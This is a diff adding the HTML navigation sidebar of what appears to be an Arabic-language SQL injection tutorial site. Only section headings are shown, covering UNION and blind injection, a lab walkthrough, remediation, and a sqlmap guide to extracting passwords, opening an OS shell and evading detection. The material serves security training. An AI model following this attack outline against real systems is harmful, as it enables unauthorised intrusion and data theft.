+        3. كيف نسرق البيانات حرفاً بحرف؟ (Data Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ملاحظة ذكية لك (تطبيقاً على ما تعلمناه):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        طريقة بناء الاستعلام في PostgreSQL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#query-postgresql" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تعديل الـ Query الخاصة بك لتناسب PostgreSQL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#remediation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الوقاية والدفاع (Remediation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        جدول DUAL في Oracle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        خصائص جدول DUAL:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        أمثلة لاستخدام جدول DUAL:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. إجراء عملية حسابية بسيطة:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#dual_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        لماذا يتم استخدام جدول DUAL؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1️⃣ الطريقة الأسهل – ORDER BY
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ما هي sqlmap أصلاً؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2️⃣ أمر المساعدة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-sqlmap" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3️⃣ أهم أقسام الخيارات في sqlmap
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4️⃣ Target (تحديد الهدف)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4️⃣ Target (تحديد الهدف)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الأمر الأساسي
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#google-dork" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Google Dork
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-request" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5️⃣ Request (كيفية إرسال الطلب)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="5️⃣ Request (كيفية إرسال الطلب)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#post-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إرسال POST Data
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cookie" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إرسال Cookie
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#user-agent" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تغيير User Agent
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#proxy" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخدام Proxy
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#tor" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخدام Tor
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-injection-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6️⃣ Injection Options
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="6️⃣ Injection Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#parameter" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تحديد Parameter
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تحديد نوع قاعدة البيانات
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7-detection-options" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7️⃣ Detection Options
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="7️⃣ Detection Options">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#level" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Level
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#risk" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Risk
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#8-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        8️⃣ Techniques
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#9-enumeration" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        9️⃣ Enumeration (استخراج البيانات)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="9️⃣ Enumeration (استخراج البيانات)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استخراج قواعد البيانات
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔟 استخراج الجداول
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#11" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        11️⃣ استخراج الأعمدة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#12" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        12️⃣ استخراج البيانات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#13" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        13️⃣ استخراج كل شيء
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#14" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        14️⃣ استخراج كلمات المرور
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#15" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        15️⃣ معرفة المستخدم الحالي
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#16-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        16️⃣ معرفة database الحالية
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        17️⃣ الوصول لنظام التشغيل
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="17️⃣ الوصول لنظام التشغيل">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#shell" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        فتح shell
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_16" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تنفيذ أمر
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_17" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        استغلال كامل
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#18-get-post" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        18️⃣ الفرق بين GET و POST
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="18️⃣ الفرق بين GET و POST">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#get-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        GET Example
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#post-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        POST Example
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#19-request-file" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        19️⃣ استخدام request file
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#20" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        20️⃣ استخراج الجداول
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#21" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        21️⃣ استخراج الأعمدة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#22" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        22️⃣ استخراج البيانات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#23-workflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        23️⃣ مثال Workflow كامل
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="23️⃣ مثال Workflow كامل">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1️⃣ اختبار الثغرة
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-dbs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2️⃣ استخراج DBs
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3️⃣ استخراج tables
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-columns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4️⃣ استخراج columns
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#5-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5️⃣ استخراج data
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#pentester" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ⚡ نصائح Pentester حقيقية
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#command" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🔥 أهم Command يستخدمه المحترفين
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_18" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        نصيحة احترافية
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="نصيحة احترافية">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#sqlmap-master-cheat-sheet" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        🛡️ SQLmap Master Cheat Sheet
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🛡️ SQLmap Master Cheat Sheet">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-targeting-basics" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الأوامر الأساسية وتحديد الهدف (Targeting &amp; Basics)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-detection-techniques" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الفحص والتحكم في التقنيات (Detection &amp; Techniques)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-enumeration-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. استخراج البيانات (Enumeration &amp; Data Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#4-advanced-evasion" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. الخيارات المتقدمة (Advanced &amp; Evasion)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7-Blind%20Sql%20Injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    أولاً: ما هو Blind SQL Injection؟
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../8-NOSQL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    📁 الدليل الشامل لأساسيات MongoDB واختبار اختراق NoSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-NoSQL%20injection/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9 NoSQL injection
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="جدول المحتويات">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      جدول المحتويات
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هي ثغرة حقن قواعد البيانات (SQL Injection)؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. ما هو السبب الجذري للثغرة؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-prerequisites" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. شروط حدوث الثغرة (Prerequisites)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-cia" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. التأثير على أمن المعلومات (مثلث CIA)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        5. عواقب إضافية متقدمة
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6-owasp-top-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        6. تصنيف وتقييم الثغرة حسب (OWASP Top 10)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        7. نبذة تاريخية وأشهر الاختراقات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        التصنيف الأساسي لثغرات SQL Injection
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="التصنيف الأساسي لثغرات SQL Injection">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-in-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الحقن المباشر (In-band SQLi)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-blind-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الحقن الأعمى (Blind SQLi)
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-out-of-band-sqli" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الحقن خارج النطاق (Out-of-band SQLi)
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#examining-the-database-in-sql-injection-attacks" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Examining the database in SQL injection attacks
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. استعلامات معرفة نوع وإصدار قاعدة البيانات
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. شرح كود الاستغلال العملي (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-output" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تحليل النتيجة المرتجعة (Output)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#listing-the-contents-of-the-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Listing the contents of the database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-information-schema" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو الـ Information Schema؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-tables" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الكود الأول: استخراج أسماء الجداول (Tables)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-columns" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. الكود الثاني: استخراج أسماء الأعمدة (Columns)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#listing-the-contents-of-an-oracle-database" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Listing the contents of an Oracle database
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-tables-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. استخراج أسماء الجداول (Tables) في Oracle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-columns-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. استخراج أسماء الأعمدة (Columns) في Oracle
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. استخراج أسماء الأعمدة (Columns) في Oracle">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#in-band-types" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        IN-BAND types :
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-union-union-attack" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو هجوم الـ UNION (UNION Attack)؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الطريقة الأولى: استخدام ORDER BY
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#union-select-null" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الطريقة الثانية: استخدام UNION SELECT NULL
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#database-specific-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Database-specific syntax :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-database-specific-syntax" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. الفروق في صيغ قواعد البيانات (Database-specific syntax)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-finding-columns-with-a-useful-data-type" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. البحث عن عمود يقبل النصوص (Finding columns with a useful data type)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#using-a-sql-injection-union-attack-to-retrieve-interesting-data" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Using a SQL injection UNION attack to retrieve interesting data :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. متى يمكنك استخراج البيانات؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. السيناريو الافتراضي للاستغلال
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-the-payload" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. كود الاستغلال النهائي (The Payload)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#retriving-multiple-values-within-a-single-column" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Retriving multiple values within a single column:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-concatenation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. فكرة دمج النصوص (Concatenation)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. شرح كود الاستغلال في Oracle
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-output_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تحليل النتيجة المرتجعة (Output)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        💡 تلميحة تقنية مهمة (فروق صيغ قواعد البيانات الأخرى):
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sql-injection" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind sql injection :
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-blind-sqli-union" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو الحقن الأعمى (Blind SQLi) ولماذا يفشل الـ UNION هنا؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-conditional-responses" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. سيناريو الاستغلال عبر الاستجابة المشروطة (Conditional Responses)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-logic-probing" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. شرح أكواد اختبار المنطق (Logic Probing)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-data-extraction" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. شرح أكواد استخراج البيانات (Data Extraction)
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4. شرح أكواد استخراج البيانات (Data Extraction)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#substring" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        فهم دالة SUBSTRING أولاً:
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تحليل الأكواد المحقونة خطوة بخطوة:
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        ماذا يحدث بعد ذلك؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#substring_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        تركيبة دالة SUBSTRING
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        مثال للتوضيح:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#limit-offset" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الحل: استخدام LIMIT و OFFSET
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="الحل: استخدام LIMIT و OFFSET">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        شكل الكود الصحيح (المفاهيمي):
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#the-iteration-process" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        إزاي تتحرك جوه البيانات؟ (The Iteration Process)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        1. ما هو الحقن المبني على الأخطاء؟
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-10" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        2. الخدعة الرياضية: القسمة على صفر (1/0)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-payloads" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        3. تحليل أكواد الاستغلال (Payloads)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-data-extraction_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        4. دمج التكتيك لاستخراج البيانات (Data Extraction)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 1: معرفة طول (عدد حروف) اسم أول جدول
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 2: استخراج اسم أول جدول (حرفاً بحرف)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-oracle" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        الخطوة 3: كيف ننتقل لاسم الجدول الثاني؟ (الخدعة في Oracle)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#blind-sql-injection-with-conditional-errors-lab" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Blind SQL injection with conditional errors LAB:
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#recon-fingerprinting" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الأولى: الاستكشاف وبصمة القاعدة (Recon &amp; Fingerprinting)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثانية: تأكيد الهدف
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_7" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الثالثة: بناء "السلاح" (الخطأ المشروط)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#repeater" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الرابعة: استخراج طول كلمة المرور (Repeater)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#intruder" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        المرحلة الخامسة: استخراج الباسورد بالكامل (Intruder)
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1_4" class="md-nav__link">
+    <span class="md-ellipsis">
